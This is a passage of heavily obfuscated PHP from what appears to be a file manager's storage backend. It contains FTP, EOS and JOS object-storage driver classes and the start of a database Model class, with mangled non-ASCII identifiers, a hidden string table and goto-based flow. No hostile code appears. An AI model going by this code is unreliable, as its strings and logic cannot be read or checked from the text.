info($˜—‘ğÆ) { if ($this->isFolder($˜—‘ğÆ)) { return $this->folderInfo($˜—‘ğÆ); } else { if ($this->isFile($˜—‘ğÆ)) { return $this->fileInfo($˜—‘ğÆ); } } return !1; } public function exist($Ù¯³¼À­) { return $this->isFile($Ù¯³¼À­) || $this->isFolder($Ù¯³¼À­); } public function isFile($úô¤ø²) { return !$this->isFolder($úô¤ø²) && $this->objectMeta($úô¤ø²); } public function isFolder($¶ı‚Õ—˜) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][180], $¶ı‚Õ—˜); } protected function objectMeta($ÔÀËóŞÑ) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][182], $ÔÀËóŞÑ); } protected function _objectMeta($ì¾˜¯°ƒ) { $áË«¨Öù =& $_SERVER[ÅÄÇĞô]; list($´×‘û, $’¯…¡ì) = $this->bucketManager->stat($this->bucket, $ì¾˜¯°ƒ); if ($´×‘û) { $´×‘û[$áË«¨Öù[79]] = intval($´×‘û[$áË«¨Öù[1555]]); } return $´×‘û; } protected function _isFolder($ÎÌŠˆüŞ) { $å†”Ô‚Ÿ =& $_SERVER[ÅÄÇĞô]; if ($ÎÌŠˆüŞ == $å†”Ô‚Ÿ[12] || $ÎÌŠˆüŞ == $å†”Ô‚Ÿ[8]) { return !0; } list($‡È¶”êó, $ÓıÍŠª¢) = $this->bucketManager->listFiles($this->bucket, trim($ÎÌŠˆüŞ, $å†”Ô‚Ÿ[8]) . $å†”Ô‚Ÿ[8], $å†”Ô‚Ÿ[12], 1, $å†”Ô‚Ÿ[8]); return !empty($‡È¶”êó[$å†”Ô‚Ÿ[1558]]) || !empty($‡È¶”êó[$å†”Ô‚Ÿ[1559]]) ? !0 : !1; } } goto eø³òïæ; E†ÈöÚ§»ó: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($—Û‡±Ô€) { parent::__construct($—Û‡±Ô€); $this->setSignVersion($_SERVER[ÅÄÇĞô][250]); } public function uploadFormData($÷– îÁê, $¢œˆ‚’– = 3600) { $È¡ª¢© =& $_SERVER[ÅÄÇĞô]; $ıŞêû³Ç = $È¡ª¢©[232]; $Ş¢½¶Ù¾ = $È¡ª¢©[260]; $´íĞˆÔ = $È¡ª¢©[62]; $¹îãĞ‚ = gmdate($È¡ª¢©[261]); $š»›‡®¯ = gmdate($È¡ª¢©[262]); $ìÉ¥©÷ = $È¡ª¢©[263]; $ƒÜ¢˜÷ = $¢œˆ‚’– . $È¡ª¢©[12]; $²¬£—÷¬ = $È¡ª¢©[264]; $–Ô˜µÀÒ = array($this->accessKey, $š»›‡®¯, $this->region, $´íĞˆÔ, $ìÉ¥©÷); $–Ù¸‹û = implode($È¡ª¢©[8], $–Ô˜µÀÒ); $§¯é„° = array($È¡ª¢©[265] => gmdate($È¡ª¢©[1436], strtotime($È¡ª¢©[267])), $È¡ª¢©[268] => array(array($È¡ª¢©[269] => $this->bucket), array($È¡ª¢©[309] => $ıŞêû³Ç), array($È¡ª¢©[270], $È¡ª¢©[271], $È¡ª¢©[12]), array($È¡ª¢©[270], $È¡ª¢©[272], $È¡ª¢©[12]), array($È¡ª¢©[270], $È¡ª¢©[310], $È¡ª¢©[12]), array($È¡ª¢©[273] => $²¬£—÷¬), array($È¡ª¢©[274] => $–Ù¸‹û), array($È¡ª¢©[275] => $Ş¢½¶Ù¾), array($È¡ª¢©[276] => $¹îãĞ‚), array($È¡ª¢©[277] => $ƒÜ¢˜÷))); $¢¨úŠèù = base64_encode(json_encode($§¯é„°)); $îÙ“ş­» = hash_hmac($È¡ª¢©[278], $š»›‡®¯, $È¡ª¢©[279] . $this->secret, !0); $¨‰ãá§Ÿ = hash_hmac($È¡ª¢©[278], $this->region, $îÙ“ş­», !0); $„¦Á°È = hash_hmac($È¡ª¢©[278], $´íĞˆÔ, $¨‰ãá§Ÿ, !0); $®œê’ = hash_hmac($È¡ª¢©[278], $ìÉ¥©÷, $„¦Á°È, !0); $ùĞà‚‚„ = hash_hmac($È¡ª¢©[278], $¢¨úŠèù, $®œê’); $‰óßÏî¨ = array($È¡ª¢©[249] => $È¡ª¢©[12], $È¡ª¢©[297] => $È¡ª¢©[12], $È¡ª¢©[309] => $ıŞêû³Ç, $È¡ª¢©[273] => $²¬£—÷¬, $È¡ª¢©[280] => $¢¨úŠèù, $È¡ª¢©[311] => $–Ù¸‹û, $È¡ª¢©[312] => $Ş¢½¶Ù¾, $È¡ª¢©[313] => $¹îãĞ‚, $È¡ª¢©[314] => $ƒÜ¢˜÷, $È¡ª¢©[315] => $ùĞà‚‚„, $È¡ª¢©[209] => $this->getHost()); return $‰óßÏî¨; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¶…Œµ±Œ) { parent::__construct(); if (count($¶…Œµ±Œ) > 0) { $this->_init($¶…Œµ±Œ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($©…™ı×) { $Á×øÙì‘ =& $_SERVER[ÅÄÇĞô]; global $config; $this->appCharset = $config[$Á×øÙì‘[1462]]; $this->systemCharset = $config[$Á×øÙì‘[1463]]; if (isset($©…™ı×[$Á×øÙì‘[1464]]) && $©…™ı×[$Á×øÙì‘[1464]]) { $this->systemCharset = $©…™ı×[$Á×øÙì‘[1464]]; } } public function iconvApp($ØÕ²˜áÄ) { return $this->iconvTo($ØÕ²˜áÄ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ù‹É·È‘) { return $this->iconvTo($ù‹É·È‘, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ş²¡ıÔÖ) { $Ç§¢¿ˆ =& $_SERVER[ÅÄÇĞô]; $µàÖë¶µ = $this->iconvApp($this->pathBase); $Ş²¡ıÔÖ = $this->iconvApp($Ş²¡ıÔÖ); if (substr($µàÖë¶µ, 0, 2) == $Ç§¢¿ˆ[1434]) { $µàÖë¶µ = BASIC_PATH . substr($µàÖë¶µ, 2); } if (substr($Ş²¡ıÔÖ, 0, 2) == $Ç§¢¿ˆ[1434]) { $Ş²¡ıÔÖ = BASIC_PATH . substr($Ş²¡ıÔÖ, 2); } $µàÖë¶µ = KodIO::clear($µàÖë¶µ); $Ş²¡ıÔÖ = KodIO::clear($Ş²¡ıÔÖ); $Ş²¡ıÔÖ = substr($Ş²¡ıÔÖ, strlen($µàÖë¶µ)); if (empty($this->pathDriver)) { return $Ş²¡ıÔÖ; } return $this->pathDriver . $Ç§¢¿ˆ[8] . ltrim($Ş²¡ıÔÖ, $Ç§¢¿ˆ[8]); } private function _init($§İæ¨åÇ = array()) { $õÅ‹ÆçÖ =& $_SERVER[ÅÄÇĞô]; if (!function_exists($õÅ‹ÆçÖ[1465])) { throw new Exception(LNG($õÅ‹ÆçÖ[1466])); } $this->config = $§İæ¨åÇ; $this->charsetReset($§İæ¨åÇ); foreach ($§İæ¨åÇ as $Ô­´”ü« => $µö’øúı) { if (isset($this->{$Ô­´”ü«})) { $this->{$Ô­´”ü«} = $µö’øúı; } } return $this->_login($§İæ¨åÇ); } private function _login($‘Ëª³òï) { $çŠÄ¸·Å =& $_SERVER[ÅÄÇĞô]; static $£æ¦¥¥Ü = array(); $ù±§›äï = md5(json_encode($‘Ëª³òï)); if (isset($£æ¦¥¥Ü[$ù±§›äï])) { foreach ($£æ¦¥¥Ü[$ù±§›äï] as $ï¨¼ìöÒ => $öœ”íÆ) { $this->{$ï¨¼ìöÒ} = $öœ”íÆ; } return !0; } $ƒ´ª’“¢ = parse_url(trim($this->server, $çŠÄ¸·Å[8])); $this->host = $ƒ´ª’“¢[$çŠÄ¸·Å[209]]; $£‹ÄêÓ = isset($ƒ´ª’“¢[$çŠÄ¸·Å[208]]) && $ƒ´ª’“¢[$çŠÄ¸·Å[208]] == $çŠÄ¸·Å[1467] ? !0 : !1; $this->scheme = $£‹ÄêÓ ? $çŠÄ¸·Å[1468] : $çŠÄ¸·Å[1469]; $this->port = isset($ƒ´ª’“¢[$çŠÄ¸·Å[210]]) ? $ƒ´ª’“¢[$çŠÄ¸·Å[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($çŠÄ¸·Å[1470]) . $this->host . $çŠÄ¸·Å[4] . $this->port, !0); return !1; } $ªõ”ä¢« = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ªõ”ä¢«) { $this->writeLog(LNG($çŠÄ¸·Å[1471]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $çŠÄ¸·Å[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ãë³ØŞô = $this->pasv == $çŠÄ¸·Å[91] ? !0 : !1; @ftp_pasv($this->connect, $ãë³ØŞô); $£æ¦¥¥Ü[$ù±§›äï] = array($çŠÄ¸·Å[1472] => $this->connect, $çŠÄ¸·Å[209] => $this->host, $çŠÄ¸·Å[208] => $this->scheme, $çŠÄ¸·Å[210] => $this->port); return $ªõ”ä¢«; } private function _isconn($±² š¨Ï = true) { if (is_resource($this->connect)) { return !0; } if (!$±² š¨Ï) { return !1; } return $this->_login($this->config); } public function mkfile($áı‘åœ, $ÁØÆƒçì = '', $òÔõèáë = REPEAT_RENAME) { if ($this->setContent($áı‘åœ, $ÁØÆƒçì)) { return $this->getPathOuter($áı‘åœ); } $this->writeLog(LNG($_SERVER[ÅÄÇĞô][1473]), !0); return !1; } public function mkdir($ŞşğÁÚÛ, $ıÉïŒï° = REPEAT_SKIP) { $ø©ªœ¡¥ =& $_SERVER[ÅÄÇĞô]; if (!$ŞşğÁÚÛ || $ŞşğÁÚÛ == $ø©ªœ¡¥[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ŞşğÁÚÛ = $this->iconvSystem($ŞşğÁÚÛ); if ($this->_isFolder($ŞşğÁÚÛ) || @ftp_mkdir($this->connect, $ŞşğÁÚÛ)) { return $this->getPathOuter($ŞşğÁÚÛ); } if (!$this->mkdir($this->pathFather($ŞşğÁÚÛ))) { return !1; } if ($ŞşğÁÚÛ = @ftp_mkdir($this->connect, $ŞşğÁÚÛ)) { return $this->getPathOuter($ŞşğÁÚÛ); } $¼˜‰áşœ = __FUNCTION__ . $ø©ªœ¡¥[1474]; $this->writeLog($¼˜‰áşœ, !0); return !1; } public function copyFile($ø¬¥í€û, $¶Œí©û) { if (!$this->_isconn()) { return !1; } $¸şï†¢ş = $this->pathThis($this->iconvSystem($ø¬¥í€û)); $¬ßÆÉÃ = $this->tempFile($¸şï†¢ş); $Ëî¸†ò… = $this->iconvApp($¬ßÆÉÃ); $this->download($ø¬¥í€û, $Ëî¸†ò…); $ºş¹Õàá = $this->upload($¶Œí©û, $Ëî¸†ò…); $this->tempFileRemve($¬ßÆÉÃ); return $ºş¹Õàá; } public function moveFile($›µ³ì†ú, $´‚¹æıı) { if (!$this->_isconn()) { return !1; } $›µ³ì†ú = $this->iconvSystem($›µ³ì†ú); $´‚¹æıı = $this->iconvSystem($´‚¹æıı); $ç‚ÕŸ = @ftp_rename($this->connect, $›µ³ì†ú, $´‚¹æıı); if (!$ç‚ÕŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } return $this->getPathOuter($´‚¹æıı); } public function delFile($­’œ©‡²) { if (!$this->_isconn()) { return !1; } $­’œ©‡² = $this->iconvSystem($­’œ©‡²); $Ö±àµ¢ó = @ftp_delete($this->connect, $­’œ©‡²); if (!$Ö±àµ¢ó) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); } return $Ö±àµ¢ó; } public function delFolder($ëÅùïÆÆ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $›Ş¤õ‡« = $Şë†®ÃÚ = array(); $this->fileList($ëÅùïÆÆ, $›Ş¤õ‡«, $Şë†®ÃÚ, !0); $this->listItemCache = !0; foreach ($Şë†®ÃÚ as $Á°»§¸Ë) { $ï§ä„¡º = $this->iconvSystem($Á°»§¸Ë[$_SERVER[ÅÄÇĞô][32]]); $ÂÂ¶Âà÷ = @ftp_delete($this->connect, $ï§ä„¡º); if (!$ÂÂ¶Âà÷) { return !1; } } foreach ($›Ş¤õ‡« as $ï§ä„¡º) { $ï§ä„¡º = $this->iconvSystem($ï§ä„¡º); $ÂÂ¶Âà÷ = @ftp_rmdir($this->connect, $ï§ä„¡º); if (!$ÂÂ¶Âà÷) { return !1; } } $ëÅùïÆÆ = $this->iconvSystem($ëÅùïÆÆ); return @ftp_rmdir($this->connect, $ëÅùïÆÆ); } public function rename($ÂÄ­ÁØ·, $Üæ¤ë¦ö) { $ÛËĞş” =& $_SERVER[ÅÄÇĞô]; if (!$this->_isconn()) { return !1; } $Šôå­¨ = $this->fileNameAuto($this->pathFather($ÂÄ­ÁØ·), $Üæ¤ë¦ö); $Šôå­¨ = $this->iconvSystem($Šôå­¨); $ÂÄ­ÁØ· = $this->iconvSystem($ÂÄ­ÁØ·); $®í‹ğÎ« = $this->pathFather($ÂÄ­ÁØ·); $Ğ¯¯ÙÂñ = rtrim($®í‹ğÎ«, $ÛËĞş”[8]) . $ÛËĞş”[8] . $Šôå­¨; $äø÷„Çö = @ftp_rename($this->connect, $ÂÄ­ÁØ·, $Ğ¯¯ÙÂñ); if (!$äø÷„Çö) { $this->writeLog(__FUNCTION__ . $ÛËĞş”[1474], !0); return !1; } $Ğ¯¯ÙÂñ = $this->iconvApp($Ğ¯¯ÙÂñ); return $this->getPathOuter($Ğ¯¯ÙÂñ); } private function folderInfo($ÆØ•²†Ó, $ŒÍóî–¿ = false) { $ô¼ ŠôÂ =& $_SERVER[ÅÄÇĞô]; $»´¾ÕÏÊ = array($ô¼ ŠôÂ[32] => $this->pathThis($ÆØ•²†Ó), $ô¼ ŠôÂ[87] => $this->getPathOuter($ô¼ ŠôÂ[8] . $ÆØ•²†Ó), $ô¼ ŠôÂ[33] => $ô¼ ŠôÂ[78]); if ($ŒÍóî–¿) { return $»´¾ÕÏÊ; } $»´¾ÕÏÊ[$ô¼ ŠôÂ[234]] = $»´¾ÕÏÊ[$ô¼ ŠôÂ[88]] = 0; $»´¾ÕÏÊ[$ô¼ ŠôÂ[235]] = $»´¾ÕÏÊ[$ô¼ ŠôÂ[236]] = !0; return $»´¾ÕÏÊ; } private function fileInfo($ÕÅ­ÂŒï, $Ñöà­ æ = false, $¤˜áıâë = array()) { $ÍçíóƒÜ =& $_SERVER[ÅÄÇĞô]; $Å½¾ÆÚ½ = array($ÍçíóƒÜ[32] => $this->pathThis($ÕÅ­ÂŒï), $ÍçíóƒÜ[87] => $this->getPathOuter($ÍçíóƒÜ[8] . $ÕÅ­ÂŒï), $ÍçíóƒÜ[33] => $ÍçíóƒÜ[233], $ÍçíóƒÜ[79] => isset($¤˜áıâë[$ÍçíóƒÜ[79]]) ? $¤˜áıâë[$ÍçíóƒÜ[79]] : 0, $ÍçíóƒÜ[169] => $this->ext($ÕÅ­ÂŒï)); if ($Ñöà­ æ) { return $Å½¾ÆÚ½; } $Å½¾ÆÚ½[$ÍçíóƒÜ[234]] = $Å½¾ÆÚ½[$ÍçíóƒÜ[88]] = 0; $Å½¾ÆÚ½[$ÍçíóƒÜ[235]] = $Å½¾ÆÚ½[$ÍçíóƒÜ[236]] = !0; $Í²ñ•œô = $this->iconvSystem($ÕÅ­ÂŒï); $Å½¾ÆÚ½[$ÍçíóƒÜ[88]] = @ftp_mdtm($this->connect, $Í²ñ•œô); if (empty($¤˜áıâë)) { $¤˜áıâë = $this->objectMeta($ÕÅ­ÂŒï); if (!$¤˜áıâë) { return $Å½¾ÆÚ½; } } $Å½¾ÆÚ½[$ÍçíóƒÜ[79]] = $¤˜áıâë[$ÍçíóƒÜ[79]]; return $Å½¾ÆÚ½; } public function size($ÚÕê‡¨Ï) { $ß³×œ = $this->objectMeta($ÚÕê‡¨Ï); return $ß³×œ ? $ß³×œ[$_SERVER[ÅÄÇĞô][79]] : 0; } public function info($é ø€‘İ) { if ($this->isFile($é ø€‘İ)) { return $this->fileInfo($é ø€‘İ, 0); } else { if ($this->isFolder($é ø€‘İ)) { return $this->folderInfo($é ø€‘İ); } } return !1; } private function fileList($ö–ıîÑÕ, &$ëÖÜ‘¨, &$”ØŸÀ½í, $‹´ô¢Ü¦ = false) { $Ì•÷×“ =& $_SERVER[ÅÄÇĞô]; $ö–ıîÑÕ = $this->iconvSystem($ö–ıîÑÕ); if (!$this->isFolder($ö–ıîÑÕ)) { return !1; } $ö–ıîÑÕ = rtrim($ö–ıîÑÕ, $Ì•÷×“[8]) . $Ì•÷×“[8]; check_abort(); $ø‡ÂÕ¶Á = @ftp_rawlist($this->connect, $ö–ıîÑÕ); if (!$ø‡ÂÕ¶Á) { $ø‡ÂÕ¶Á = array(); } $µ®Ñ©ù = array($Ì•÷×“[10] => 1, $Ì•÷×“[1386] => 1); foreach ($ø‡ÂÕ¶Á as $‹äüøİ˜) { $ßêÎ—ş÷ = $this->_listItem($‹äüøİ˜); if ($ßêÎ—ş÷[0] == $Ì•÷×“[853]) { continue; } $À–ŒÄ¤§ = $ßêÎ—ş÷[8]; if (empty($À–ŒÄ¤§) && $À–ŒÄ¤§ !== $Ì•÷×“[231] || isset($µ®Ñ©ù[$À–ŒÄ¤§])) { continue; } $À–ŒÄ¤§ = $this->iconvApp($ö–ıîÑÕ . ltrim($À–ŒÄ¤§, $Ì•÷×“[8])); $´É¹ÍÜ„ = array($Ì•÷×“[32] => $À–ŒÄ¤§, $Ì•÷×“[33] => $Ì•÷×“[233], $Ì•÷×“[79] => $ßêÎ—ş÷[4]); if (substr($‹äüøİ˜, 0, 1) == $Ì•÷×“[1475]) { $´É¹ÍÜ„[$Ì•÷×“[33]] = $Ì•÷×“[78]; $´É¹ÍÜ„[$Ì•÷×“[79]] = 0; } $¤¥ÄØ¨‹ = $´É¹ÍÜ„[$Ì•÷×“[33]] == $Ì•÷×“[78] ? !0 : !1; $this->cacheMethodInfoSet($À–ŒÄ¤§, $¤¥ÄØ¨‹, $´É¹ÍÜ„); if ($¤¥ÄØ¨‹) { $ëÖÜ‘¨[] = $À–ŒÄ¤§; if ($‹´ô¢Ü¦) { $this->fileList($À–ŒÄ¤§, $ëÖÜ‘¨, $”ØŸÀ½í, $‹´ô¢Ü¦); } continue; } $”ØŸÀ½í[] = $´É¹ÍÜ„; } $this->cacheMethodInfoSet($ö–ıîÑÕ, !0); } private function _listItem($Æ„€¿İã) { if (empty($Æ„€¿İã)) { return array(); } $¼Û›Êí÷ = preg_split($_SERVER[ÅÄÇĞô][1476], $Æ„€¿İã); if (count($¼Û›Êí÷) <= 9) { return $¼Û›Êí÷; } $¼Û›Êí÷[8] = trim(substr($Æ„€¿İã, strpos($Æ„€¿İã, $¼Û›Êí÷[7]) + strlen($¼Û›Êí÷[7]))); return array_splice($¼Û›Êí÷, 0, 9); } public function listPath($¦Èî¬Ñó, $í”Çïê­ = false) { $˜·‚Ä—é =& $_SERVER[ÅÄÇĞô]; if (!$this->_isconn()) { return !1; } $·ˆ£’Üè = $ìÄ¡·À¼ = array(); $this->fileList($¦Èî¬Ñó, $·ˆ£’Üè, $ìÄ¡·À¼); foreach ($·ˆ£’Üè as $ãæğ£…Ü => $î××€ù) { $·ˆ£’Üè[$ãæğ£…Ü] = $this->folderInfo($î××€ù, $í”Çïê­); } foreach ($ìÄ¡·À¼ as $ãæğ£…Ü => $î××€ù) { $ìÄ¡·À¼[$ãæğ£…Ü] = $this->fileInfo($î××€ù[$˜·‚Ä—é[32]], $í”Çïê­, $î××€ù); } return array($˜·‚Ä—é[85] => $·ˆ£’Üè, $˜·‚Ä—é[86] => $ìÄ¡·À¼); } public function has($Ûºı±Ë´, $±ĞéßÑ = false, $“ø¼¾Ò = true) { $êÜÄÅ¿û =& $_SERVER[ÅÄÇĞô]; $ƒ³Æ÷’í = $Ô›À‰÷Ÿ = array(); $ßøÀñ±Ğ = $±ĞéßÑ ? !0 : !1; $this->fileList($Ûºı±Ë´, $ƒ³Æ÷’í, $Ô›À‰÷Ÿ, $ßøÀñ±Ğ); if ($±ĞéßÑ) { return array($êÜÄÅ¿û[242] => count($Ô›À‰÷Ÿ), $êÜÄÅ¿û[243] => count($ƒ³Æ÷’í)); } if ($“ø¼¾Ò) { if (count($Ô›À‰÷Ÿ)) { return !0; } } else { if (count($ƒ³Æ÷’í)) { return !0; } } return !1; } public function listAll($ÌµÈÀ³Ü) { $ñä‘à‹ =& $_SERVER[ÅÄÇĞô]; if (!$this->_isconn()) { return !1; } $·˜Ş×èñ = $¥ÔêÎíš = array(); $this->fileList($ÌµÈÀ³Ü, $·˜Ş×èñ, $¥ÔêÎíš, !0); $’¶‰šôº = array_to_keyvalue($¥ÔêÎíš, $ñä‘à‹[32]); foreach ($·˜Ş×èñ as $·áØ”Á) { if (is_string($·áØ”Á)) { $’¶‰šôº[$·áØ”Á] = array($ñä‘à‹[79] => 0); } } return $this->listAllFiles($ÌµÈÀ³Ü, $’¶‰šôº); } public function getContent($ø‘ø¡›‘) { if (!$this->_isconn()) { return !1; } $ø‘ø¡›‘ = $this->iconvSystem($ø‘ø¡›‘); return $this->fileSubstr($ø‘ø¡›‘); } public function setContent($òø¤ğøà, $½È´©ª± = '') { if (!$this->_isconn()) { return !1; } $’‘ÈÑšò = $this->pathThis($this->iconvSystem($òø¤ğøà)); $¢Å»‰œñ = $this->tempFile($’‘ÈÑšò); file_put_contents($¢Å»‰œñ, $½È´©ª±); $—‚¢ŠÁÀ = $this->upload($òø¤ğøà, $this->iconvApp($¢Å»‰œñ)); $this->tempFileRemve($¢Å»‰œñ); return $—‚¢ŠÁÀ; } public function fileSubstr($†¢õ½Á, $ÀñÎÄõ = 0, $Éãäğ† = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($†¢õ½Á, $ÀñÎÄõ, $Éãäğ†); } private function ftpRequest($”©÷ÁÜ¹, $‹›Õ¶ªØ = 0, $¸øÇÍ˜Í = false) { $Ğ÷­ÎÌ =& $_SERVER[ÅÄÇĞô]; $”©÷ÁÜ¹ = $Ğ÷­ÎÌ[8] . ltrim(str_ltrim($”©÷ÁÜ¹, $this->ftpPath), $Ğ÷­ÎÌ[8]); $”©÷ÁÜ¹ = $this->iconvSystem($”©÷ÁÜ¹); $¡ÏË¡™¿ = $this->scheme . $this->host . $Ğ÷­ÎÌ[4] . $this->port; $†›Ñšı‹ = curl_init(); curl_setopt($†›Ñšı‹, CURLOPT_URL, $¡ÏË¡™¿ . $this->pathEncode($”©÷ÁÜ¹)); curl_setopt($†›Ñšı‹, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¸øÇÍ˜Í) { $ëú²Îø¼ = $‹›Õ¶ªØ + $¸øÇÍ˜Í - 1; curl_setopt($†›Ñšı‹, CURLOPT_RANGE, "{$‹›Õ¶ªØ}\55{$ëú²Îø¼}"); } curl_setopt($†›Ñšı‹, CURLOPT_RETURNTRANSFER, 1); $‡£‡—ˆ = curl_exec($†›Ñšı‹); curl_close($†›Ñšı‹); return $‡£‡—ˆ; } public function upload($ö•±õÏÍ, $Ş£â®ÔÊ, $¥¼è¨µ = false, $ÌôúÉÏ¥ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ö•±õÏÍ))) { return !1; } $ö•±õÏÍ = $this->iconvSystem($ö•±õÏÍ); $Ş£â®ÔÊ = $this->iconvSystem($Ş£â®ÔÊ); $½°¯¨ö = ftp_nb_put($this->connect, $ö•±õÏÍ, $Ş£â®ÔÊ, FTP_BINARY); while ($½°¯¨ö == FTP_MOREDATA) { $½°¯¨ö = ftp_nb_continue($this->connect); } if ($½°¯¨ö != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } return $this->getPathOuter($ö•±õÏÍ); } public function download($•ÕŸá¯ı, $’óèÑ‘å = '') { if (!$this->_isconn()) { return !1; } $É‚óî£ó = $this->pathFather($’óèÑ‘å); if (!IO::mkdir($É‚óî£ó)) { return !1; } $•ÕŸá¯ı = $this->iconvSystem($•ÕŸá¯ı); $’óèÑ‘å = $this->iconvSystem($’óèÑ‘å); $ÍÕ’ÀÚ = ftp_nb_get($this->connect, $’óèÑ‘å, $•ÕŸá¯ı, FTP_BINARY); while ($ÍÕ’ÀÚ == FTP_MOREDATA) { $ÍÕ’ÀÚ = ftp_nb_continue($this->connect); } if ($ÍÕ’ÀÚ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); return !1; } return $this->iconvApp($’óèÑ‘å); } public function exist($ñÓ ‹¦Å) { return $this->isFile($ñÓ ‹¦Å) || $this->isFolder($ñÓ ‹¦Å); } public function isFile($‚¸îÓæû) { return !$this->isFolder($‚¸îÓæû) && $this->objectMeta($‚¸îÓæû); } public function isFolder($÷ÁËí“) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][180], $÷ÁËí“); } protected function objectMeta($Ñè¿ÁÆ‹) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][182], $Ñè¿ÁÆ‹); } protected function _objectMeta($Ø¶‹¯’Í) { $çõš£å =& $_SERVER[ÅÄÇĞô]; if ($Ø¶‹¯’Í == $çõš£å[12] || $Ø¶‹¯’Í == $çõš£å[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ø¶‹¯’Í = $this->iconvSystem($Ø¶‹¯’Í); $ñÔŒÒ¸ä = array($çõš£å[32] => $this->iconvApp($Ø¶‹¯’Í), $çõš£å[33] => $çõš£å[233], $çõš£å[79] => 0); $Ù°«Õà· = @ftp_size($this->connect, $Ø¶‹¯’Í); if ($Ù°«Õà· != -1) { $ñÔŒÒ¸ä[$çõš£å[79]] = $Ù°«Õà·; } else { $úÔüßõ = @ftp_chdir($this->connect, $Ø¶‹¯’Í); if (!$úÔüßõ) { return !1; } @ftp_chdir($this->connect, $çõš£å[8]); $ñÔŒÒ¸ä[$çõš£å[33]] = $çõš£å[78]; } return $ñÔŒÒ¸ä; } protected function _isFolder($¶Û„úÚÁ) { $·Ñ¡ææ =& $_SERVER[ÅÄÇĞô]; if ($¶Û„úÚÁ == $·Ñ¡ææ[12] || $¶Û„úÚÁ == $·Ñ¡ææ[8]) { return !0; } $ÑÌ‰†ï = $this->_objectMeta($¶Û„úÚÁ); return isset($ÑÌ‰†ï[$·Ñ¡ææ[33]]) && $ÑÌ‰†ï[$·Ñ¡ææ[33]] == $·Ñ¡ææ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Ô™‡„‚) { parent::__construct($Ô™‡„‚); $this->setSignVersion($_SERVER[ÅÄÇĞô][250]); } public function uploadLink($Ş«ÃÉÛ€, $Ÿ»ùàÑÃ = 0) { $Öˆ­Úå =& $_SERVER[ÅÄÇĞô]; if ($this->isUploadServer()) { return; } $ë™ğ¡İ  = $this->getType(); if (!in_array($ë™ğ¡İ , $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $öÕçìÓ” = (!$Ÿ»ùàÑÃ ? 1 : ceil($Ÿ»ùàÑÃ / pow(1024, 3))) * 3600 * 4; $Ø©ÑÌ¨‰ = $this->uploadMultiData($Ş«ÃÉÛ€, $öÕçìÓ”); if ($Ø©ÑÌ¨‰) { $Ø©ÑÌ¨‰[$Öˆ­Úå[97]] = $Ş«ÃÉÛ€; $Ø©ÑÌ¨‰[$Öˆ­Úå[98]] = $ë™ğ¡İ ; } return $Ø©ÑÌ¨‰; } public function fileOutImage($ªğîÈ¤Ê, $òõ²Æµ® = 250) { if ($this->size($ªğîÈ¤Ê) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ªğîÈ¤Ê, $òõ²Æµ®); } $ ôîÅó = $this->link($ªğîÈ¤Ê); $ ôîÅó .= $_SERVER[ÅÄÇĞô][1477] . $òõ²Æµ®; $this->fileOutLink($ ôîÅó); } public function fileOutLink($©öìªÉ ) { $ŒåÂÔ· =& $_SERVER[ÅÄÇĞô]; if (substr($©öìªÉ , 0, 7) == $ŒåÂÔ·[219]) { $©öìªÉ  = $ŒåÂÔ·[220] . substr($©öìªÉ , 7); } header($ŒåÂÔ·[175] . $©öìªÉ ); die; } } goto c¡ÈÔ¸ŸŸÚ; F³Õ‚´èï: define($_SERVER[ÅÄÇĞô][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\145", "\x6f\162\144\145\x72", "\141\154\151\x61\x73", "\x68\x61\166\151\156\x67", "\147\162\157\x75\160", "\154\x6f\x63\153", "\144\x69\163\x74\151\156\x63\164", "\x61\x75\x74\x6f", "\x66\x69\154\164\145\162", "\x76\x61\154\x69\x64\141\x74\145", "\162\145\x73\x75\154\164", "\142\151\156\144", "\164\157\x6b\145\x6e"); public function __construct($ĞÏ¾äˆï = '', $†ÃÎƒê = '', $Ù€Ëºë = '') { $–ÎâÕ” =& $_SERVER[ÅÄÇĞô]; $this->_initialize(); if (!empty($ĞÏ¾äˆï)) { if (strpos($ĞÏ¾äˆï, $–ÎâÕ”[10])) { list($this->dbName, $this->name) = explode($–ÎâÕ”[10], $ĞÏ¾äˆï); } else { $this->name = $ĞÏ¾äˆï; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); 